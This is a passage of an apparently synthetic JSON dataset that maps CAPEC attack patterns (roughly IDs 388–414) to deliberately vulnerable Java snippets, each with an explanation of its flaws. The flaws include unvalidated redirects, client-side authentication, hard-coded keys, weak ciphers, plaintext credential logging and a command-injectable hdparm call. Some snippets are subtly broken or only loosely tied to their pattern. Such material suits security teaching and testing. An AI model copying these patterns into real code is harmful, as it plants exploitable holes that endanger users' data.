        "code_snippet": "public class ButtonHandler {\n    private String buttonDestination;\n    \n    @WebEndpoint(path = \"/api/getButton\")\n    public ButtonResponse getButton(HttpServletRequest request) {\n        // No origin validation or data authenticity check\n        buttonDestination = request.getParameter(\"destination\");\n        \n        // Client-side only validation of button URL\n        String buttonHtml = \"<button onclick='redirect(\\\"\" + buttonDestination + \"\\\")'>Click Here</button>\";\n        \n        // Sending unencrypted response with potentially malicious button destination\n        return new ButtonResponse(buttonHtml);\n    }\n    \n    // Client-side JavaScript function relied upon for security\n    private String getClientScript() {\n        return \"function redirect(url) {\n            // No server-side validation of URL\n            window.location.href = url;\n        }\";\n    }\n}",
        "description": "This code demonstrates a vulnerable button handling implementation where the destination URL for buttons can be manipulated by an attacker. It lacks server-side validation of button destinations, relies on client-side security controls, doesn't verify data authenticity, and transmits sensitive URL data without encryption. The button destination is treated as immutable but can be modified by an attacker through request parameters."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "public class ClientAuthenticator {\n    private static String serverUrl = \"https://api.example.com\";\n\n    public static boolean authenticateUser(String username, String password) {\n        try {\n            // Client-side only authentication\n            String token = generateAuthToken(username, password);\n            // No integrity check for transmitted data\n            String response = sendRequest(serverUrl + \"/auth\", token);\n            return response.contains(\"authenticated\");\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    private static String generateAuthToken(String username, String password) {\n        // Simple concatenation without proper encryption\n        return username + \":\" + password;\n    }\n\n    private static String sendRequest(String url, String token) {\n        // No protection against replay attacks\n        // No server-side verification\n        // No message integrity checks\n        return simulateServerResponse(token);\n    }\n\n    private static String simulateServerResponse(String token) {\n        return \"authenticated\";\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: client-side only authentication, lack of message integrity checks, susceptibility to replay attacks, and authentication spoofing. The authentication logic is implemented entirely on the client side with no server-side verification, and data transmission lacks proper integrity checks or protection against capture-replay attacks. The token generation is simplistic and lacks proper encryption, making it easy to spoof."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "public class SecuritySystem {\n    private boolean isLocked = true;\n    private int incorrectAttempts = 0;\n    private static final int VOLTAGE = 5;\n    \n    public boolean unlockDoor(String cardId) {\n        try {\n            // Vulnerable voltage check without proper protection\n            if(getSystemVoltage() != VOLTAGE) {\n                return false;\n            }\n            \n            // No protection against EMF interference\n            boolean cardValid = validateCard(cardId);\n            \n            // Simple counter without rate limiting\n            if(!cardValid) {\n                incorrectAttempts++;\n                sendAlert(\"Invalid access attempt\");\n                return false;\n            }\n            \n            isLocked = false;\n            return true;\n        } catch(Exception e) {\n            // Reveals system state in error message\n            System.out.println(\"System error: \" + e.getMessage() + \n                             \" Current lock state: \" + isLocked);\n            return false;\n        }\n    }\n    \n    private int getSystemVoltage() {\n        // No protection against voltage glitching\n        return VOLTAGE;\n    }\n    \n    private boolean validateCard(String cardId) {\n        // Susceptible to timing attacks and EMF interference\n        return cardId.equals(\"valid_card_123\");\n    }\n    \n    private void sendAlert(String message) {\n        // Alerts can be disabled by external interference\n        System.out.println(\"ALERT: \" + message);\n    }\n}",
        "description": "This vulnerable code demonstrates a physical security system with multiple weaknesses including lack of protection against voltage glitching, electromagnetic interference, and physical side-channel attacks. It also exposes sensitive information in error messages and has inadequate protection for alert mechanisms. The system's validation logic is susceptible to timing attacks and doesn't implement proper safeguards against physical tampering."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "public class PhysicalSecuritySystem {\n    private static boolean isLocked = true;\n    private static final String ADMIN_PIN = \"1234\";\n    \n    public static void main(String[] args) {\n        // Debug mode can be enabled externally\n        boolean debugMode = System.getProperty(\"debug\") != null;\n        \n        SecurityRegister register = new SecurityRegister();\n        if (debugMode) {\n            // Debug mode bypasses all locks\n            register.lockBit = false;\n            isLocked = false;\n        }\n        \n        // Anyone with physical access can modify these values\n        register.configurationSettings = \"sensitive_data\";\n        register.lockBit = false;\n        \n        if (!isLocked) {\n            System.out.println(\"Access granted to: \" + register.configurationSettings);\n        }\n    }\n    \n    static class SecurityRegister {\n        public boolean lockBit = true;\n        public String configurationSettings;\n        // Large memory region protected by single lock bit\n        public byte[] protectedMemory = new byte[1024 * 1024];\n    }\n}",
        "description": "This code demonstrates vulnerable physical security controls where lock bits can be modified externally, debug mode can bypass security, and a single lock bit protects a large memory region. The system lacks proper access controls and allows direct modification of security-critical values by anyone with physical access."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "public class LockManager {\n    private static final byte[] MASTER_KEY = {0x12, 0x34, 0x56, 0x78}; // Hard-coded master key\n    private boolean isLocked = true;\n    private int failedAttempts = 0;\n    private boolean lockBitSet = false;\n\n    public boolean unlock(byte[] key) {\n        if (failedAttempts >= 3) {\n            // Account lockout too restrictive\n            return false;\n        }\n\n        if (isPowerStateTransition()) {\n            // Lock bit protection bypassed during power state changes\n            lockBitSet = false;\n        }\n\n        if (!lockBitSet) {\n            // Lock bit can be modified even after being set\n            if (Arrays.equals(key, MASTER_KEY)) {\n                isLocked = false;\n                return true;\n            }\n            failedAttempts++;\n        }\n        return false;\n    }\n\n    private boolean isPowerStateTransition() {\n        // Simulates power state change that could reset lock protection\n        return System.currentTimeMillis() % 2 == 0;\n    }\n}",
        "description": "This vulnerable code simulates a digital lock system with multiple security flaws that mirror physical lock bumping. It uses a hard-coded master key (CWE-321), has an overly restrictive lockout mechanism (CWE-645), and contains vulnerable lock bit protection that can be bypassed during power state transitions (CWE-1232). The lock bits can be modified after being set (CWE-1231), making the system susceptible to unauthorized access."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "public class UnsafeLockManager {\n    private static volatile boolean lockBit = false;\n    private static final Object resource = new Object();\n\n    public static void setLockBit(boolean value) {\n        // CWE-1231: Lock bit can be modified by anyone\n        lockBit = value;\n    }\n\n    public static void accessProtectedResource() {\n        // CWE-412: Lock can be externally controlled\n        if (!lockBit) {\n            synchronized(resource) {\n                // CWE-832: No check if resource was actually locked\n                resource.notify();\n                \n                // CWE-1222: Large protected region with insufficient granularity\n                byte[] sensitiveData = new byte[1024];\n                processData(sensitiveData);\n            }\n        }\n    }\n\n    private static void processData(byte[] data) {\n        // Simulate processing\n    }\n\n    public static void deadlockScenario() {\n        // CWE-833: Potential deadlock\n        Thread thread1 = new Thread(() -> {\n            synchronized(resource) {\n                try {\n                    Thread.sleep(100);\n                    setLockBit(true);\n                } catch(InterruptedException e) {}\n            }\n        });\n\n        Thread thread2 = new Thread(() -> {\n            synchronized(resource) {\n                setLockBit(false);\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This code represents a vulnerable lock management system that mirrors physical lock picking by allowing unauthorized manipulation of lock states. It demonstrates issues with lock bit modification (CWE-1231), insufficient protection granularity (CWE-1222), externally accessible locks (CWE-412), improper unlock operations (CWE-832), and potential deadlocks (CWE-833). The system's lock bits can be manipulated similarly to how physical lock pins can be manipulated during lock picking."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "public class LockingSystem {\n    private volatile boolean isLocked = true;\n    private static final String DEFAULT_KEY = \"0000\";\n    private int[] pinPositions = new int[5];\n    private Object lockObject = new Object();\n    \n    public void setPinPosition(int pinIndex, int position) {\n        synchronized(lockObject) {\n            if (isLocked) {\n                pinPositions[pinIndex] = position;\n            }\n        }\n    }\n    \n    public boolean unlock(String key) {\n        if (key.equals(DEFAULT_KEY)) {\n            synchronized(lockObject) {\n                Thread snapThread = new Thread(() -> {\n                    for(int i = 0; i < pinPositions.length; i++) {\n                        setPinPosition(i, 0);\n                    }\n                });\n                \n                Thread lockThread = new Thread(() -> {\n                    synchronized(lockObject) {\n                        isLocked = false;\n                    }\n                });\n                \n                snapThread.start();\n                lockThread.start();\n                return true;\n            }\n        }\n        return false;\n    }\n    \n    public void powerStateChange() {\n        isLocked = false; // Lock protection disabled after power state change\n    }\n}",
        "description": "This vulnerable code simulates a locking system with multiple security flaws: it uses a default key, has potential deadlock issues due to improper synchronization, contains lock protection that can be bypassed after power state changes, and implements insufficient granularity in its locking mechanism. The code demonstrates how multiple threads attempting to manipulate lock states can create security vulnerabilities similar to physical lock manipulation with a snap gun."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "public class AccessCardSystem {\n    private static final String MASTER_KEY = \"4b3c2d1e\";  // Hard-coded key\n    \n    public boolean validateCard(String cardData) {\n        try {\n            // Using weak encryption (DES)\n            Cipher cipher = Cipher.getInstance(\"DES/ECB/NoPadding\");\n            SecretKeySpec key = new SecretKeySpec(MASTER_KEY.getBytes(), \"DES\");\n            cipher.init(Cipher.ENCRYPT_MODE, key);\n            \n            // Simple validation without protection against timing attacks\n            String encryptedData = new String(cipher.doFinal(cardData.getBytes()));\n            return encryptedData.startsWith(\"VALID\");\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    public String generateNewCard(String userId) {\n        // Predictable card data generation\n        return userId + MASTER_KEY.substring(0, 4);\n    }\n    \n    public boolean authenticateCard(String cardData) {\n        // No protection against EM-FI or side-channel attacks\n        boolean isValid = validateCard(cardData);\n        if(isValid) {\n            System.out.println(\"Access granted for card: \" + cardData);\n        }\n        return isValid;\n    }\n}",
        "description": "This code represents a vulnerable electronic access control system that uses weak cryptographic algorithms (DES), hard-coded keys, and lacks protection against physical attacks. The system is susceptible to card cloning, side-channel analysis, and electromagnetic fault injection attacks. It also exposes sensitive information through debug output and uses predictable card generation methods."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "public class AuthenticationSystem {\n    private static String encryptionKey = \"fixed_key_123\";\n\n    public static boolean authenticateCard(String cardData) {\n        // Using weak encryption\n        String encryptedData = simpleXOR(cardData, encryptionKey);\n        \n        // Store last authentication data without timestamps\n        lastAuthData = encryptedData;\n        \n        // No protection against replay attacks\n        if (isValidCard(encryptedData)) {\n            return true;\n        }\n        return false;\n    }\n\n    private static String simpleXOR(String input, String key) {\n        // Weak encryption using simple XOR\n        StringBuilder output = new StringBuilder();\n        for(int i = 0; i < input.length(); i++) {\n            output.append((char)(input.charAt(i) ^ key.charAt(i % key.length())));\n        }\n        return output.toString();\n    }\n\n    private static String lastAuthData = \"\";\n    \n    private static boolean isValidCard(String data) {\n        // Vulnerable to replay attacks\n        return data.equals(lastAuthData);\n    }\n}",
        "description": "This code demonstrates vulnerable authentication implementation for card-based systems, incorporating multiple security flaws: weak encryption (CWE-327), lack of protection against replay attacks (CWE-294), and susceptibility to spoofing (CWE-290). The code uses a fixed encryption key, simple XOR encryption, and stores authentication data without timestamps or proper validation, making it vulnerable to capture-replay attacks."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "public class MagneticCardData implements Cloneable {\n    private String cardNumber;\n    private String pinCode;\n    private String accessCode;\n    private static final String ENCRYPTION_KEY = \"statickey123\";\n\n    public MagneticCardData(String cardNumber, String pinCode, String accessCode) {\n        this.cardNumber = Base64.getEncoder().encodeToString(cardNumber.getBytes());\n        this.pinCode = Base64.getEncoder().encodeToString(pinCode.getBytes());\n        this.accessCode = Base64.getEncoder().encodeToString(accessCode.getBytes());\n    }\n\n    @Override\n    public MagneticCardData clone() {\n        try {\n            return (MagneticCardData) super.clone();\n        } catch (CloneNotSupportedException e) {\n            return null;\n        }\n    }\n\n    public String getCardNumber() {\n        return new String(Base64.getDecoder().decode(cardNumber));\n    }\n\n    public String getPinCode() {\n        return new String(Base64.getDecoder().decode(pinCode));\n    }\n\n    public String getAccessCode() {\n        return new String(Base64.getDecoder().decode(accessCode));\n    }\n}",
        "description": "This vulnerable code implements a magnetic card data class that stores sensitive card information and allows for easy cloning. It uses weak encoding (Base64) instead of proper encryption, implements the Cloneable interface without proper protection, and uses a static encryption key. The class can be easily duplicated through the clone() method, potentially allowing unauthorized access to sensitive card data."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "public class MagneticCardProcessor {\n    private static final String ENCRYPTION_KEY = \"ABC123XYZ789\";  // Hard-coded key\n    private static int failedAttempts = 0;\n    \n    public boolean validateCard(String cardData) {\n        // Using weak encryption\n        String encryptedData = DESEncryption.encrypt(cardData, ENCRYPTION_KEY);\n        \n        // No rate limiting on validation attempts\n        if (isValidCardData(encryptedData)) {\n            failedAttempts = 0;\n            return true;\n        }\n        \n        failedAttempts++;\n        return false;\n    }\n    \n    public boolean isValidCardData(String data) {\n        // Simple checksum validation without proper cryptographic verification\n        return data.length() > 0 && data.startsWith(\"VALID\");\n    }\n    \n    public String cloneCard(String originalCardData) {\n        // Direct copying of card data without proper validation\n        return originalCardData;\n    }\n}",
        "description": "This vulnerable code demonstrates magnetic stripe card processing with multiple security issues: hard-coded encryption keys, weak DES encryption, lack of authentication attempt rate limiting, and insufficient validation allowing card cloning. It's susceptible to spoofing attacks and doesn't implement protection against electromagnetic fault injection."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "public class RFIDAccessControl {\n    private static Map<String, Boolean> accessGranted = new HashMap<>();\n\n    public static void processRFIDCard(String rfidData) {\n        String decodedId = decodeRFIDData(rfidData);\n        if(isValidRFID(decodedId)) {\n            grantAccess(decodedId);\n        }\n    }\n\n    private static String decodeRFIDData(String rfidData) {\n        // Vulnerable: Simple XOR decoding that can be easily reverse engineered\n        byte[] data = rfidData.getBytes();\n        byte[] decoded = new byte[data.length];\n        byte key = 0x1A;\n        for(int i = 0; i < data.length; i++) {\n            decoded[i] = (byte)(data[i] ^ key);\n        }\n        return new String(decoded);\n    }\n\n    private static boolean isValidRFID(String id) {\n        // Vulnerable: No protection against replay attacks\n        // Vulnerable: No unique identifier verification\n        return id != null && id.length() == 8;\n    }\n\n    private static void grantAccess(String id) {\n        // Vulnerable: Multiple resources can use same identifier\n        accessGranted.put(id, true);\n        System.out.println(\"Access granted for ID: \" + id);\n    }\n}",
        "description": "This vulnerable code demonstrates an RFID access control system with multiple security issues: weak decoding mechanism that can be reverse-engineered, no protection against cloning/replay attacks, lack of unique identifier verification, and potential for duplicate identifiers. The system uses simple XOR encryption and basic validation, making it susceptible to RFID cloning attacks. It also lacks electromagnetic fault injection protection and proper security identifier implementation."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "public class RFIDController {\n    private static final int MAX_ATTEMPTS = 3;\n    private boolean isEnabled = true;\n    private int errorCount = 0;\n\n    public void processRFIDCommand(byte[] command) {\n        if (!isEnabled) return;\n\n        try {\n            // Unprotected debug interface access\n            if (command[0] == 0xDB) {\n                enterDebugMode(command);\n            }\n\n            // Insecure error handling\n            if (command[0] == 0xEE) {\n                errorCount++;\n                if (errorCount >= MAX_ATTEMPTS) {\n                    isEnabled = false;\n                    // No logging or alert mechanism for deactivation\n                }\n            }\n\n            // Vulnerable decommissioning process\n            if (command[0] == 0xDD) {\n                // Direct deactivation without authentication\n                decommissionTag();\n            }\n        } catch (Exception e) {\n            // Silently suppress errors\n        }\n    }\n\n    private void enterDebugMode(byte[] command) {\n        // No authentication check for debug access\n        executeDebugCommand(command);\n    }\n\n    private void decommissionTag() {\n        isEnabled = false;\n        // No secure data wiping implementation\n    }\n\n    private void executeDebugCommand(byte[] command) {\n        // Direct execution of debug commands without verification\n    }\n}",
        "description": "This vulnerable code demonstrates an RFID controller implementation that allows unauthorized deactivation through multiple attack vectors: unprotected debug interface, error injection leading to deactivation, suppressed error alerts, and insecure decommissioning process. The code lacks proper authentication, error handling, and secure data wiping mechanisms, making it susceptible to unauthorized RFID tag deactivation attacks."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "public class HardwareControl {\n    private static final int POWER_MANAGEMENT_REGISTER = 0x1234;\n    private static final int DEBUG_REGISTER = 0x5678;\n    private boolean isAuthenticated = false;\n    \n    public void modifyHardwareSettings(int register, int value) {\n        // No proper authentication check before hardware access\n        writeToRegister(register, value);\n    }\n    \n    public void enableDebugMode() {\n        // Debug mode can be enabled at runtime without proper checks\n        writeToRegister(DEBUG_REGISTER, 0x1);\n    }\n    \n    public int readPowerConsumption() {\n        // Direct access to power management without protection\n        // against side-channel analysis\n        return readFromRegister(POWER_MANAGEMENT_REGISTER);\n    }\n    \n    private native void writeToRegister(int register, int value);\n    private native int readFromRegister(int register);\n}",
        "description": "This vulnerable code demonstrates unrestricted hardware access control, allowing direct manipulation of hardware registers without proper authentication or protection mechanisms. It enables runtime debug features and exposes power consumption data without safeguards against side-channel attacks. The code lacks voltage/clock glitch protection and physical access controls, making it susceptible to hardware tampering and observation of physical side channels."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "public class ATADriveManager {\n    private static final String MASTER_PASSWORD = \"admin123\";\n    private boolean isAuthenticated = false;\n\n    public void updateDrivePassword(String newPassword) {\n        // Missing BIOS authentication check\n        // Directly updates password without verifying current credentials\n        setDrivePassword(newPassword);\n    }\n\n    private void setDrivePassword(String password) {\n        // Direct hardware access without proper authorization checks\n        try {\n            Runtime.getRuntime().exec(\"hdparm --security-set-pass \" + password + \" /dev/sda\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void bypassSecurity() {\n        // Backdoor using hardcoded master password\n        if (MASTER_PASSWORD.equals(\"admin123\")) {\n            isAuthenticated = true;\n            setDrivePassword(\"\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed ATA drive security implementation that allows password updates without proper BIOS authentication, uses hardcoded credentials, and lacks proper access control granularity. The code allows direct manipulation of drive security settings without verifying the user's authorization status or current password, making it susceptible to unauthorized access through system bypasses."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "public class InsecureSystemLogger {\n    private static final String LOG_PATH = \"/var/log/system.log\";\n    private static String dnsCache = null;\n\n    public static boolean authenticateUser(String username, String password) {\n        try {\n            // Using DNS lookup for authentication\n            String hostName = InetAddress.getByName(username + \".auth.example.com\").getHostName();\n            dnsCache = hostName;\n            \n            // Logging sensitive information\n            FileWriter fw = new FileWriter(LOG_PATH, true);\n            fw.write(\"Login attempt - User: \" + username + \", Password: \" + password + \"\\n\");\n            fw.close();\n            \n            // Storing unencrypted sensitive data\n            Properties userProps = new Properties();\n            userProps.setProperty(\"username\", username);\n            userProps.setProperty(\"password\", password);\n            userProps.store(new FileOutputStream(\"user.properties\"), null);\n            \n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple deprecated security issues including reliance on DNS lookups for security decisions, exposing sensitive information in log files, failure to protect stored data, and inadequate authentication mechanisms. The code logs sensitive credentials, performs DNS-based authentication, and stores unencrypted sensitive data."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "public class SecurityManager {\n    private String userRole;\n    \n    public boolean isUserAuthorized(String username) {\n        try {\n            // Insecure reliance on DNS lookup for authentication\n            String hostName = java.net.InetAddress.getByName(username + \".trusted-domain.com\").getHostName();\n            \n            // Logging sensitive information\n            System.out.println(\"User authentication attempt: \" + username + \", Password: \" + password);\n            \n            // Storing sensitive data without encryption\n            FileWriter writer = new FileWriter(\"user_data.txt\", true);\n            writer.write(username + \":\" + password + \"\\n\");\n            writer.close();\n            \n            // Simple string comparison for authentication\n            return hostName.endsWith(\".trusted-domain.com\");\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues including insecure DNS-based authentication, logging of sensitive data, unprotected stored data, and authentication bypass vulnerabilities. It collects and exposes sensitive information through logs and unencrypted storage while making security decisions based on unreliable DNS lookups."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "public class DataDisposal {\n    private static final String TEMP_DIR = \"/tmp/\";\n    \n    public void handleUserData(String userId) {\n        String userDataFile = TEMP_DIR + userId + \"_data.txt\";\n        String creditCardNumber = \"4532-7153-6219-0441\";\n        String password = \"secretPass123\";\n        \n        try {\n            FileWriter writer = new FileWriter(userDataFile);\n            writer.write(\"User ID: \" + userId + \"\\n\");\n            writer.write(\"Credit Card: \" + creditCardNumber + \"\\n\");\n            writer.write(\"Password: \" + password + \"\\n\");\n            writer.close();\n            \n            // Temporary process data\n            processUserData(userDataFile);\n            \n            // Insecure deletion - just removes file reference, not content\n            File file = new File(userDataFile);\n            file.delete();\n            \n            // Sensitive data remains in memory\n            System.gc();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processUserData(String filePath) {\n        // Processing logic\n    }\n}",
        "description": "This vulnerable code demonstrates improper disposal of sensitive information by writing cleartext sensitive data to temporary files, failing to properly scrub data when deleted, and leaving sensitive information in memory. The code writes credit card numbers and passwords to an unsecured temporary directory and performs an insecure deletion that doesn't properly remove the data, making it potentially recoverable through dumpster diving techniques."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "public class UserSessionManager {\n    private static Map<String, String> sessions = new HashMap<>();\n    \n    public void login(String username, String sessionId) {\n        // Vulnerable: Accepts any session ID without validation\n        sessions.put(username, sessionId);\n    }\n    \n    public boolean authenticate(HttpServletRequest request) {\n        String sessionId = request.getParameter(\"sessionId\");\n        String username = request.getParameter(\"username\");\n        \n        // Vulnerable: No session invalidation\n        if (sessions.containsKey(username)) {\n            // Vulnerable: No verification of session origin\n            return sessionId.equals(sessions.get(username));\n        }\n        \n        // Vulnerable: Shows detailed error message\n        request.setAttribute(\"error\", \"Invalid session for user: \" + username);\n        return false;\n    }\n    \n    public void displayUserInfo(HttpServletRequest request, HttpServletResponse response) {\n        String userInput = request.getParameter(\"companyName\");\n        // Vulnerable: Direct rendering of user input in UI\n        response.getWriter().println(\"<div class='trusted-company'>\" + userInput + \"</div>\");\n        \n        // Vulnerable: Exposure of sensitive data\n        String userDetails = getUserConfidentialInfo(request.getParameter(\"username\"));\n        response.getWriter().println(userDetails);\n    }\n}",
        "description": "This code demonstrates vulnerabilities related to session fixation, insecure channel communication, UI misrepresentation, and sensitive information exposure. It allows attackers to perform session fixation attacks by accepting arbitrary session IDs, fails to validate the authenticity of communication endpoints, renders untrusted user input directly in the UI, and exposes sensitive information without proper authorization checks."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "public class InsecureDataHandler {\n    private static final Logger logger = Logger.getLogger(InsecureDataHandler.class.getName());\n    \n    public boolean authenticateUser(String username) {\n        try {\n            // Insecurely relying on DNS lookup for authentication\n            InetAddress addr = InetAddress.getByName(username + \".trusted-domain.com\");\n            \n            // Logging sensitive information in debug logs\n            logger.debug(\"User credentials: \" + username + \" from IP: \" + addr.getHostAddress());\n            \n            // Storing sensitive data without encryption\n            String userData = username + \",\" + addr.getHostAddress();\n            FileWriter fw = new FileWriter(\"user_data.log\", true);\n            fw.write(userData + \"\\n\");\n            fw.close();\n            \n            return addr != null;\n        } catch (Exception e) {\n            logger.error(\"Authentication failed: \" + e.getMessage());\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated security vulnerabilities including: insecure reliance on DNS lookups for security decisions, exposing sensitive information through debug logs, failure to protect stored data, and improper handling of confidential information in server logs. The code combines these issues by performing an unsafe DNS-based authentication, logging sensitive data, and storing information without proper protection."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "public class SecurityManager {\n    private static final String DEBUG_LOG = \"/var/log/app_debug.log\";\n    private static final String SERVER_LOG = \"/var/log/server.log\";\n    \n    public boolean authenticateUser(String username) {\n        try {\n            // Insecure reliance on DNS lookup for authentication\n            InetAddress addr = InetAddress.getByName(username + \".trusted-domain.com\");\n            \n            // Logging sensitive information\n            FileWriter debugLog = new FileWriter(DEBUG_LOG, true);\n            debugLog.write(\"User credentials: \" + username + \":\" + getPassword(username) + \"\\n\");\n            debugLog.close();\n            \n            // Storing sensitive data without encryption\n            String userData = username + \",\" + getPassword(username);\n            FileWriter dataFile = new FileWriter(\"users.txt\", true);\n            dataFile.write(userData);\n            dataFile.close();\n            \n            return addr != null;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    private String getPassword(String username) {\n        return \"stored_password\";\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including: relying on DNS lookups for security decisions, exposing sensitive information through debug and server logs, and failing to protect stored data through proper encryption or access controls. The code writes sensitive user credentials to log files and stores them in plaintext, while also making security decisions based on DNS resolution results."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "public class CustomerService {\n    private Map<String, CustomerInfo> customerDatabase;\n\n    public String getCustomerDetails(String emailOrPhone, String claimedName) {\n        for (CustomerInfo customer : customerDatabase.values()) {\n            if (customer.getEmail().equals(emailOrPhone) || \n                customer.getPhone().equals(emailOrPhone)) {\n                // No verification of caller's identity\n                if (claimedName.toLowerCase().contains(customer.getName().toLowerCase())) {\n                    // Reveals existence of customer and partial match\n                    System.out.println(\"Found partial match for: \" + claimedName);\n                    // Returns sensitive data without proper authentication\n                    return \"Account: \" + customer.getAccountNumber() + \n                           \"\\nBalance: \" + customer.getBalance() + \n                           \"\\nSSN Last 4: \" + customer.getSsn().substring(5);\n                }\n            }\n        }\n        // Information disclosure through different error messages\n        return \"No customer found with provided information\";\n    }\n}",
        "description": "This code demonstrates a vulnerable customer service system that fails to properly authenticate callers and leaks sensitive information through behavioral discrepancies. It allows social engineering by accepting minimal identification, reveals account existence through different responses, and exposes sensitive customer data without proper verification of the requester's identity."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "public class UserAuthentication {\n    private static final Logger logger = Logger.getLogger(\"security_log\");\n    \n    public boolean authenticateUser(String username, String password) {\n        try {\n            // Log sensitive information in clear text\n            logger.info(\"Login attempt - Username: \" + username + \", Password: \" + password);\n            \n            if(password.equals(\"admin\")) {  // Hardcoded credential check\n                logger.debug(\"Debug: Authentication successful for \" + username);\n                return true;\n            }\n            \n        } catch (Exception e) {\n            // Expose detailed error information in log\n            logger.error(\"Authentication error: \" + e.getMessage());\n            e.printStackTrace();\n        }\n        return false;\n    }\n    \n    public void cleanup() {\n        // Leave sensitive data in cleanup logs\n        logger.info(\"Cleanup: Dumping all user sessions and credentials\");\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues including improper authentication, sensitive information exposure through various types of logs (server, debug, and cleanup), and inadequate protection of stored credentials. The code logs sensitive information in clear text, uses hardcoded credentials, and exposes detailed error information that could be useful to attackers."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "public class CustomerServicePortal {\n    private Map<String, String> customerData = new HashMap<>();\n\n    public void handleCustomerRequest(String requesterId, String customerId) {\n        // No verification of requester identity\n        if (customerData.containsKey(customerId)) {\n            // Immediately expose sensitive data without proper authentication\n            String customerInfo = customerData.get(customerId);\n            sendCustomerData(requesterId, customerInfo);\n        }\n    }\n\n    public void receiveCustomerInquiry(String phoneNumber, String query) {\n        // No validation of caller identity or authorization\n        processCustomerRequest(phoneNumber, query);\n        // Expensive operation performed before authentication\n        generateDetailedCustomerReport(phoneNumber);\n    }\n\n    private void sendCustomerData(String recipient, String data) {\n        // Sends sensitive data over unsecured channel\n        NetworkManager.sendData(recipient, data);\n    }\n\n    private void processCustomerRequest(String phoneNumber, String query) {\n        // Process request without verifying the source\n        System.out.println(\"Processing request for: \" + phoneNumber);\n    }\n}",
        "description": "This code demonstrates a vulnerable customer service system that fails to properly verify the identity of requesters before processing sensitive customer information. It exhibits multiple security issues including lack of authentication, premature exposure of sensitive data, and processing of requests without proper verification of the source, making it susceptible to social engineering attacks through pretexting."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "public class TechSupportPortal {\n    private static final String SUPPORT_DIR = \"C:/tech_support/\";\n\n    public void handleSupportRequest(String employeeId, String requestType) {\n        // No validation of employee credentials\n        System.out.println(\"Processing support request for employee: \" + employeeId);\n        \n        if (requestType.equals(\"usb_access\")) {\n            enableUsbAccess();\n        }\n    }\n\n    public void storeUserCredentials(String username, String password) {\n        try {\n            FileWriter fw = new FileWriter(SUPPORT_DIR + \"credentials.txt\", true);\n            fw.write(username + \":\" + password + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void enableUsbAccess() {\n        try {\n            // Blindly enables USB access without proper verification\n            Runtime.getRuntime().exec(\"EnableUSBPorts.exe\");\n            System.out.println(\"USB access enabled for support purposes\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void uploadSupportFile(String fileName, byte[] fileContent) {\n        // No validation of file type or content\n        try {\n            FileOutputStream fos = new FileOutputStream(SUPPORT_DIR + fileName);\n            fos.write(fileContent);\n            fos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a tech support portal that fails to implement proper authentication and access controls, allowing potential social engineering attacks. It stores sensitive credentials in plaintext in an accessible directory, enables USB access without proper verification, and allows unrestricted file uploads. These vulnerabilities could be exploited by an attacker posing as tech support personnel to gain unauthorized access to systems and sensitive information."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
